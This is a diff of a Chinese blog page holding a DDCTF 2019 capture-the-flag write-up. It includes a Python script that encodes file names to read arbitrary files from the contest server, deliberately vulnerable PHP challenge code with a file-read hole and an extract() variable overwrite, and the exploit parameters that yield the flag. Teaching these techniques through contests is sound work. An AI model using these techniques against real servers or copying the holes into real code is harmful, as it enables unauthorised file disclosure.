@@ -267,7 +267,7 @@ height:50vh;
                 
                 
                     <div class="post-intro-read">
-                        <span>Word count: <span class="post-count">493</span> / Reading time: <span class="post-count">2 min</span></span>
+                        <span>Word count: <span class="post-count">649</span> / Reading time: <span class="post-count">3 min</span></span>
                     </div>
                 
                 <div class="post-intro-meta">
@@ -396,8 +396,9 @@ height:50vh;
         <div class="container container-unloaded">
             <main class="main post-page">
     <article class="article-entry">
-        <h2 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h2><h3 id="滴"><a href="#滴" class="headerlink" title="滴~"></a>滴~</h3><p>进入发现<code>?jpg=TmpZMlF6WXhOamN5UlRaQk56QTJOdz09</code>有点像文件读取，应该可以读取敏感文件，但是不可以直接输入敏感文件的明文<br><img src="/2019/04/15/DDCTF2019/1.png" alt="DDCTF2019"><br>其中<code>TmpZMlF6WXhOamN5UlRaQk56QTJOdz09</code> 应该是通过加密后得到<br>两次base64，一次base16解密后得到 flag.jpg 得知加密规则<br>将index.php一次base16加密后，再两次base64加密后得到<code>TmprMlJUWTBOalUzT0RKRk56QTJPRGN3</code><br>尝试文件读取：<code>?jpg=TmprMlJUWTBOalUzT0RKRk56QTJPRGN3</code>，界面没有东西，查看源码得到：<br><img src="/2019/04/15/DDCTF2019/2.png" alt="DDCTF2019"><br>发现可以直接base64解码，得到index.php的源码：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * https://blog.csdn.net/FengBanLiuYun/article/details/80616607</span></span><br><span class="line"><span class="comment"> * Date: July 4,2018</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">error_reporting(E_ALL || ~E_NOTICE);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">header(<span class="string">'content-type:text/html;charset=utf-8'</span>);</span><br><span class="line"><span class="keyword">if</span>(! <span class="keyword">isset</span>($_GET[<span class="string">'jpg'</span>]))</span><br><span class="line">    header(<span class="string">'Refresh:0;url=./index.php?jpg=TmpZMlF6WXhOamN5UlRaQk56QTJOdz09'</span>);</span><br><span class="line">$file = hex2bin(base64_decode(base64_decode($_GET[<span class="string">'jpg'</span>])));</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'&lt;title&gt;'</span>.$_GET[<span class="string">'jpg'</span>].<span class="string">'&lt;/title&gt;'</span>;</span><br><span class="line">$file = preg_replace(<span class="string">"/[^a-zA-Z0-9.]+/"</span>,<span class="string">""</span>, $file);</span><br><span class="line"><span class="keyword">echo</span> $file.<span class="string">'&lt;/br&gt;'</span>;</span><br><span class="line">$file = str_replace(<span class="string">"config"</span>,<span class="string">"!"</span>, $file);</span><br><span class="line"><span class="keyword">echo</span> $file.<span class="string">'&lt;/br&gt;'</span>;</span><br><span class="line">$txt = base64_encode(file_get_contents($file));</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;img src='data:image/gif;base64,"</span>.$txt.<span class="string">"'&gt;&lt;/img&gt;"</span>;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Can you find the flag file?</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p>
-<p>发现!被config替代。<br>扫描敏感目录，发现有config.php但是无法直接读取，有<code>practice.txt.swp</code><br>编码后读取，查看源码发现一串字符串：<code>ZjFhZyFkZGN0Zi5waHA=</code>解码后得到：<code>f1ag!ddctf.php</code><br>将<code>!</code>换成<code>config</code>,将<code>f1agconfigddctf.php</code>使用同样编码方式编码后，放入?jpg后，查看源码发现一串字符传，base64解码得到<code>config.php</code>的源码：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span>(<span class="string">'config.php'</span>);</span><br><span class="line">$k = <span class="string">'hello'</span>;</span><br><span class="line">extract($_GET);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($uid))</span><br><span class="line">&#123;</span><br><span class="line">    $content=trim(file_get_contents($k));</span><br><span class="line">    <span class="keyword">if</span>($uid==$content)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">echo</span> $flag;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">echo</span><span class="string">'hello'</span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p>
+        <h2 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h2><h3 id="滴"><a href="#滴" class="headerlink" title="滴~"></a>滴~</h3><p>进入发现<code>?jpg=TmpZMlF6WXhOamN5UlRaQk56QTJOdz09</code>有点像文件读取，应该可以读取敏感文<br>件，但是不可以直接输入敏感文件的明文<br><img src="/2019/04/15/DDCTF2019/1.png" alt="DDCTF2019"><br>其中<code>TmpZMlF6WXhOamN5UlRaQk56QTJOdz09</code> 应该是通过加密后得到<br>两次base64，一次base16解密后得到 flag.jpg 得知加密规则<br>可以写一个python脚本方便操作：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">s = <span class="string">'index.php'</span></span><br><span class="line">jpg = base64.b64encode(base64.b64encode(<span class="string">""</span>.join(<span class="string">"&#123;:02x&#125;"</span>.format(ord(c)) <span class="keyword">for</span> c <span class="keyword">in</span> s).encode(<span class="string">'utf-8'</span>))).decode(<span class="string">'utf-8'</span>)</span><br><span class="line">r = requests.get(<span class="string">'http://117.51.150.246/index.php'</span>, params=&#123;<span class="string">'jpg'</span>: jpg&#125;)</span><br><span class="line">print(r.url)</span><br><span class="line">print(r.text)</span><br></pre></td></tr></table></figure></p>
+<p>将index.php解密后得到<code>TmprMlJUWTBOalUzT0RKRk56QTJPRGN3</code><br>尝试文件读取：<code>?jpg=TmprMlJUWTBOalUzT0RKRk56QTJPRGN3</code>，界面没有东西，查看源码得到：<br><img src="/2019/04/15/DDCTF2019/2.png" alt="DDCTF2019"><br>发现可以直接base64解码，得到index.php的源码：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * https://blog.csdn.net/FengBanLiuYun/article/details/80616607</span></span><br><span class="line"><span class="comment"> * Date: July 4,2018</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">error_reporting(E_ALL || ~E_NOTICE);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">header(<span class="string">'content-type:text/html;charset=utf-8'</span>);</span><br><span class="line"><span class="keyword">if</span>(! <span class="keyword">isset</span>($_GET[<span class="string">'jpg'</span>]))</span><br><span class="line">    header(<span class="string">'Refresh:0;url=./index.php?jpg=TmpZMlF6WXhOamN5UlRaQk56QTJOdz09'</span>);</span><br><span class="line">$file = hex2bin(base64_decode(base64_decode($_GET[<span class="string">'jpg'</span>])));</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'&lt;title&gt;'</span>.$_GET[<span class="string">'jpg'</span>].<span class="string">'&lt;/title&gt;'</span>;</span><br><span class="line">$file = preg_replace(<span class="string">"/[^a-zA-Z0-9.]+/"</span>,<span class="string">""</span>, $file);</span><br><span class="line"><span class="keyword">echo</span> $file.<span class="string">'&lt;/br&gt;'</span>;</span><br><span class="line">$file = str_replace(<span class="string">"config"</span>,<span class="string">"!"</span>, $file);</span><br><span class="line"><span class="keyword">echo</span> $file.<span class="string">'&lt;/br&gt;'</span>;</span><br><span class="line">$txt = base64_encode(file_get_contents($file));</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;img src='data:image/gif;base64,"</span>.$txt.<span class="string">"'&gt;&lt;/img&gt;"</span>;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Can you find the flag file?</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p>
+<p>可以看到我们可以任意读取文件，但有过滤，限制了只能为数字和字母，且 config 会被转换为感叹号。多番尝试无法绕过。<br>到 index.php 开头注释里的博客看看，没啥东西。那么到博客里的其他文章转转。发现有这么一篇，进去看看。<br><img src="/2019/04/15/DDCTF2019/1_1.png" alt="DDCTF2019"><br>发现有practice.txt.swp文件名<br><img src="/2019/04/15/DDCTF2019/1_2.png" alt="DDCTF2019"><br>直接访问，发现f1ag!ddctf.php<br><img src="/2019/04/15/DDCTF2019/1_3.png" alt="DDCTF2019"><br>但如果要读取这个文件，直接读取的话感叹号会被过滤。想输入感叹号得用上前面的规则，也就是 config 被替换为感叹号<br>将<code>!</code>换成<code>config</code>,将<code>f1agconfigddctf.php</code>使用同样编码方式编码后，放入?jpg后，查看源码发现一串字符传，base64解码得到<code>config.php</code>的源码：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span>(<span class="string">'config.php'</span>);</span><br><span class="line">$k = <span class="string">'hello'</span>;</span><br><span class="line">extract($_GET);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($uid))</span><br><span class="line">&#123;</span><br><span class="line">    $content=trim(file_get_contents($k));</span><br><span class="line">    <span class="keyword">if</span>($uid==$content)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">echo</span> $flag;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">echo</span><span class="string">'hello'</span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p>
 <p>变量覆盖<br>get传参<code>?k=&amp;uid=</code><br>得到flag<br><img src="/2019/04/15/DDCTF2019/3.png" alt="DDCTF2019"></p>
 <p>### </p>
 <h2 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h2><h3 id="Wireshark"><a href="#Wireshark" class="headerlink" title="Wireshark"></a>Wireshark</h3><p>发现有HTTP流，将HTTP文件全部导出，发现有一张图片。(其实这张图片根本没用2333)<br><img src="/2019/04/15/DDCTF2019/4.png" alt="DDCTF2019"><br>发现其他文件有数据不对。尝试foremost提取，提取到一个1.7MB的图片和一张钥匙图片<br>修改图片高度发现key<br><img src="/2019/04/15/DDCTF2019/5.png" alt="DDCTF2019"><br>使用在线图片解密隐藏信息(隐写术)工具网站<code>http://tools.jb51.net/aideddesign/img_add_info</code><br><img src="/2019/04/15/DDCTF2019/6.png" alt="DDCTF2019"><br>base16解密这串数字<code>44444354467B5145576F6B63704865556F32574F6642494E37706F6749577346303469526A747D</code>得到flag<br><img src="/2019/04/15/DDCTF2019/7.png" alt="DDCTF2019"></p>
@@ -1525,6 +1526,30 @@ top:50vh;
     
     
     
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
     <div class="total-and-search">
         <div class="total-archive">
         Total : 66
@@ -1540,6 +1565,11 @@ top:50vh;
     
     <div class="archive-year"> 2019 </div>
     <ul class="year-list">
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">05/06</span><a class="archive-post-title" href= "/2019/05/06/docker/" >docker的学习</a>
+        </li>
     
     
         <li class="archive-post-item">
@@ -1802,12 +1832,12 @@ top:50vh;
     
     
         <li class="archive-post-item">
-            <span class="archive-post-date">07/04</span><a class="archive-post-title" href= "/2018/07/04/sql注入总结/" >SQL注入总结</a>
+            <span class="archive-post-date">07/04</span><a class="archive-post-title" href= "/2018/07/04/java环境配置/" >java环境配置及版本共存问题</a>
         </li>
     
     
         <li class="archive-post-item">
-            <span class="archive-post-date">07/04</span><a class="archive-post-title" href= "/2018/07/04/java环境配置/" >java环境配置及版本共存问题</a>
+            <span class="archive-post-date">07/04</span><a class="archive-post-title" href= "/2018/07/04/sql注入总结/" >SQL注入总结</a>
         </li>
     
     
@@ -1838,11 +1868,6 @@ top:50vh;
     
         <li class="archive-post-item">
             <span class="archive-post-date">06/01</span><a class="archive-post-title" href= "/2018/06/01/git/" >git learn</a>
-        </li>
-    
-    
-        <li class="archive-post-item">
-            <span class="archive-post-date">05/30</span><a class="archive-post-title" href= "/2018/05/30/docker/" >docker的学习</a>
         </li>
     
     
